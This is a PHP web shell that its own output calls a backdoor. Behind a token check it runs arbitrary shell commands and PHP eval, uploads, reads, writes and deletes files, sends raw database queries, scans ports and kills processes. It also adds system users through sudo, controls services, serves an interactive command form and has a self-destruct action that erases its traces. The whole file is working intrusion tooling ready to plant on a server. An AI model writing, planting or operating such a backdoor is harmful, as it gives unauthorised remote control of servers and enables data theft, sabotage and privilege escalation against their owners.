<?php

session_start();

header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');

$tokenFile = '/path/to/token.txt';  // Secure path for token
$logFile = '/path/to/log.txt';      // Secure path for action logs
$errorLog = '/path/to/error.log';   // Secure path for error logs
$encryptionKey = 'your-secret-key'; // Key for encrypting sensitive data

$allowedIPs = ['127.0.0.1', '::1']; // Add allowed IPs here
if (!in_array($_SERVER['REMOTE_ADDR'], $allowedIPs)) {
    die('Unauthorized IP');
}

$maxAttempts = 5;
$lockoutTime = 300; // 5 minutes
if (!isset($_SESSION['attempts'])) {
    $_SESSION['attempts'] = 0;
}
if ($_SESSION['attempts'] >= $maxAttempts) {
    if (time() - $_SESSION['lastAttempt'] < $lockoutTime) {
        die('Too many attempts. Try again later.');
    } else {
        $_SESSION['attempts'] = 0;
    }
}

if (!file_exists($tokenFile)) {
    $token = bin2hex(random_bytes(16));
    file_put_contents($tokenFile, $token);
} else {
    $token = file_get_contents($tokenFile);
}


$providedToken = $_POST['token'] ?? $_GET['token'] ?? '';
if ($providedToken !== $token) {
    $_SESSION['attempts']++;
    $_SESSION['lastAttempt'] = time();
    die('Unauthorized');
} else {
    $_SESSION['attempts'] = 0;
}

$action = $_POST['action'] ?? $_GET['action'] ?? '';


function encryptData($data, $key) {
    $iv = random_bytes(16);
    $encrypted = openssl_encrypt($data, 'AES-256-CBC', $key, 0, $iv);
    return base64_encode($iv . $encrypted);
}

function decryptData($data, $key) {
    $data = base64_decode($data);
    $iv = substr($data, 0, 16);
    $encrypted = substr($data, 16);
    return openssl_decrypt($encrypted, 'AES-256-CBC', $key, 0, $iv);
}

function logAction($action, $details) {
    global $logFile;
    $timestamp = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'];
    $logEntry = "[$timestamp] [$ip] Action: $action, Details: $details\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND);
}

try {
    switch ($action) {
        // **Original Features with POST Support**
        case 'exec':
            $cmd = $_POST['cmd'] ?? $_GET['cmd'] ?? '';
            if (!empty($cmd)) {
                $output = shell_exec($cmd);
                echo $output;
                logAction('exec', "Command: $cmd");
            } else {
                echo "No command provided";
            }
            break;

        case 'upload':
            if (isset($_FILES['file']) && ($_POST['target'] ?? $_GET['target'] ?? '')) {
                $target = $_POST['target'] ?? $_GET['target'];
                if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
                    echo "File uploaded to $target";
                    logAction('upload', "Target: $target");
                } else {
                    echo "Upload failed";
                }
            } else {
                echo "File or target path not specified";
            }
            break;

        case 'download':
            $file = $_POST['file'] ?? $_GET['file'] ?? '';
            if (file_exists($file)) {
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                readfile($file);
                logAction('download', "File: $file");
                exit;
            } else {
                echo "File not found";
            }
            break;

        case 'ls':
            $dir = $_POST['dir'] ?? $_GET['dir'] ?? '.';
            if (is_dir($dir)) {
                $files = scandir($dir);
                echo implode("\n", $files);
                logAction('ls', "Directory: $dir");
            } else {
                echo "Directory not found";
            }
            break;

        case 'read':
            $file = $_POST['file'] ?? $_GET['file'] ?? '';
            if (file_exists($file)) {
                echo file_get_contents($file);
                logAction('read', "File: $file");
            } else {
                echo "File not found";
            }
            break;

        case 'write':
            $file = $_POST['file'] ?? $_GET['file'] ?? '';
            $content = $_POST['content'] ?? $_GET['content'] ?? '';
            if (!empty($file) && !empty($content)) {
                if (file_put_contents($file, $content)) {
                    echo "Written to $file";
                    logAction('write', "File: $file");
                } else {
                    echo "Write failed";
                }
            } else {
                echo "File or content not specified";
            }
            break;

        case 'db':
            $query = $_POST['query'] ?? $_GET['query'] ?? '';
            if (!empty($query)) {
                $conn = new mysqli('localhost', 'user', 'pass', 'db'); // Replace with actual credentials
                if ($conn->connect_error) {
                    throw new Exception("Connection failed: " . $conn->connect_error);
                }
                $result = $conn->query($query);
                if ($result) {
                    while ($row = $result->fetch_assoc()) {
                        print_r($row);
                    }
                    logAction('db', "Query: $query");
                } else {
                    throw new Exception("Query failed: " . $conn->error);
                }
                $conn->close();
            } else {
                echo "No query provided";
            }
            break;

        case 'info':
            phpinfo();
            logAction('info', "Server info requested");
            break;

        case 'eval':
            $code = $_POST['code'] ?? $_GET['code'] ?? '';
            if (!empty($code)) {
                eval($code);
                logAction('eval', "Code: $code");
            } else {
                echo "No code provided";
            }
            break;

        case 'scan':
            $host = $_POST['host'] ?? $_GET['host'] ?? '';
            $port = $_POST['port'] ?? $_GET['port'] ?? '';
            if (!empty($host) && !empty($port)) {
                $fp = @fsockopen($host, $port, $errno, $errstr, 2);
                if ($fp) {
                    echo "Port $port is open on $host";
                    fclose($fp);
                } else {
                    echo "Port $port is closed on $host";
                }
                logAction('scan', "Host: $host, Port: $port");
            } else {
                echo "Host or port not specified";
            }
            break;

        case 'ps':
            echo shell_exec('ps aux');
            logAction('ps', "Process list requested");
            break;

        case 'kill':
            $pid = $_POST['pid'] ?? $_GET['pid'] ?? '';
            if (!empty($pid)) {
                echo shell_exec("kill $pid");
                logAction('kill', "PID: $pid");
            } else {
                echo "PID not specified";
            }
            break;

        case 'copy':
            $source = $_POST['source'] ?? $_GET['source'] ?? '';
            $destination = $_POST['destination'] ?? $_GET['destination'] ?? '';
            if (!empty($source) && !empty($destination)) {
                if (copy($source, $destination)) {
                    echo "File copied from $source to $destination";
                    logAction('copy', "Source: $source, Destination: $destination");
                } else {
                    echo "Copy failed";
                }
            } else {
                echo "Source or destination not specified";
            }
            break;

        case 'move':
            $source = $_POST['source'] ?? $_GET['source'] ?? '';
            $destination = $_POST['destination'] ?? $_GET['destination'] ?? '';
            if (!empty($source) && !empty($destination)) {
                if (rename($source, $destination)) {
                    echo "File moved from $source to $destination";
                    logAction('move', "Source: $source, Destination: $destination");
                } else {
                    echo "Move failed";
                }
            } else {
                echo "Source or destination not specified";
            }
            break;

        case 'delete':
            $file = $_POST['file'] ?? $_GET['file'] ?? '';
            if (!empty($file)) {
                if (unlink($file)) {
                    echo "File $file deleted";
                    logAction('delete', "File: $file");
                } else {
                    echo "Delete failed";
                }
            } else {
                echo "File not specified";
            }
            break;

        case 'rename':
            $oldName = $_POST['old_name'] ?? $_GET['old_name'] ?? '';
            $newName = $_POST['new_name'] ?? $_GET['new_name'] ?? '';
            if (!empty($oldName) && !empty($newName)) {
                if (rename($oldName, $newName)) {
                    echo "File renamed from $oldName to $newName";
                    logAction('rename', "Old: $oldName, New: $newName");
                } else {
                    echo "Rename failed";
                }
            } else {
                echo "Old name or new name not specified";
            }
            break;

        case 'mkdir':
            $dir = $_POST['dir'] ?? $_GET['dir'] ?? '';
            if (!empty($dir)) {
                if (mkdir($dir, 0755, true)) {
                    echo "Directory $dir created";
                    logAction('mkdir', "Directory: $dir");
                } else {
                    echo "Directory creation failed";
                }
            } else {
                echo "Directory not specified";
            }
            break;

        case 'rmdir':
            $dir = $_POST['dir'] ?? $_GET['dir'] ?? '';
            if (!empty($dir)) {
                if (rmdir($dir)) {
                    echo "Directory $dir deleted";
                    logAction('rmdir', "Directory: $dir");
                } else {
                    echo "Directory deletion failed";
                }
            } else {
                echo "Directory not specified";
            }
            break;

        case 'adduser':
            $username = $_POST['username'] ?? $_GET['username'] ?? '';
            $password = $_POST['password'] ?? $_GET['password'] ?? '';
            if (!empty($username) && !empty($password)) {
                $encryptedPass = encryptData($password, $GLOBALS['encryptionKey']);
                $output = shell_exec("sudo useradd $username && echo '$username:$password' | sudo chpasswd");
                echo $output ?: "User $username added";
                logAction('adduser', "Username: $username");
            } else {
                echo "Username or password not specified";
            }
            break;

        case 'deluser':
            $username = $_POST['username'] ?? $_GET['username'] ?? '';
            if (!empty($username)) {
                $output = shell_exec("sudo userdel $username");
                echo $output ?: "User $username deleted";
                logAction('deluser', "Username: $username");
            } else {
                echo "Username not specified";
            }
            break;

        case 'listusers':
            echo shell_exec('getent passwd');
            logAction('listusers', "User list requested");
            break;

        case 'start_service':
            $service = $_POST['service'] ?? $_GET['service'] ?? '';
            if (!empty($service)) {
                $output = shell_exec("sudo service $service start");
                echo $output ?: "Service $service started";
                logAction('start_service', "Service: $service");
            } else {
                echo "Service not specified";
            }
            break;

        case 'stop_service':
            $service = $_POST['service'] ?? $_GET['service'] ?? '';
            if (!empty($service)) {
                $output = shell_exec("sudo service $service stop");
                echo $output ?: "Service $service stopped";
                logAction('stop_service', "Service: $service");
            } else {
                echo "Service not specified";
            }
            break;

        case 'restart_service':
            $service = $_POST['service'] ?? $_GET['service'] ?? '';
            if (!empty($service)) {
                $output = shell_exec("sudo service $service restart");
                echo $output ?: "Service $service restarted";
                logAction('restart_service', "Service: $service");
            } else {
                echo "Service not specified";
            }
            break;

        case 'ping':
            $host = $_POST['host'] ?? $_GET['host'] ?? '';
            if (!empty($host)) {
                $output = shell_exec("ping -c 4 $host");
                echo $output ?: "Ping failed";
                logAction('ping', "Host: $host");
            } else {
                echo "Host not specified";
            }
            break;

        case 'traceroute':
            $host = $_POST['host'] ?? $_GET['host'] ?? '';
            if (!empty($host)) {
                $output = shell_exec("traceroute $host");
                echo $output ?: "Traceroute failed";
                logAction('traceroute', "Host: $host");
            } else {
                echo "Host not specified";
            }
            break;

        case 'dns_lookup':
            $host = $_POST['host'] ?? $_GET['host'] ?? '';
            if (!empty($host)) {
                $ip = gethostbyname($host);
                echo $ip !== $host ? $ip : "DNS lookup failed";
                logAction('dns_lookup', "Host: $host");
            } else {
                echo "Host not specified";
            }
            break;

        case 'cpu_info':
            echo shell_exec('lscpu');
            logAction('cpu_info', "CPU info requested");
            break;

        case 'mem_info':
            echo shell_exec('free -h');
            logAction('mem_info', "Memory info requested");
            break;

        case 'disk_usage':
            echo shell_exec('df -h');
            logAction('disk_usage', "Disk usage requested");
            break;

        case 'uptime':
            echo shell_exec('uptime');
            logAction('uptime', "Uptime requested");
            break;

        case 'shell':
            echo '<form method="POST" action="?action=exec&token=' . htmlspecialchars($token) . '">';
            echo '<input type="text" name="cmd" placeholder="Enter command">';
            echo '<input type="hidden" name="token" value="' . htmlspecialchars($token) . '">';
            echo '<input type="submit" value="Execute">';
            echo '</form>';
            if (isset($_POST['cmd'])) {
                echo '<pre>' . shell_exec($_POST['cmd']) . '</pre>';
            }
            logAction('shell', "Web shell accessed");
            break;

        case 'self_destruct':
            unlink(__FILE__);
            unlink($tokenFile);
            unlink($logFile);
            unlink($errorLog);
            echo 'Backdoor self-destructed';
            logAction('self_destruct', "Script terminated");
            break;

        case 'load_plugin':
            $plugin = $_POST['plugin'] ?? $_GET['plugin'] ?? '';
            if (!empty($plugin) && file_exists("plugins/$plugin.php")) {
                include "plugins/$plugin.php";
                logAction('load_plugin', "Plugin: $plugin");
            } else {
                echo "Plugin not found";
            }
            break;

        default:
            echo "Invalid or no action specified";
            break;
    }
} catch (Exception $e) {
    $errorMessage = 'An error occurred: ' . $e->getMessage();
    echo $errorMessage;
    error_log($errorMessage, 3, $errorLog);
}
?>
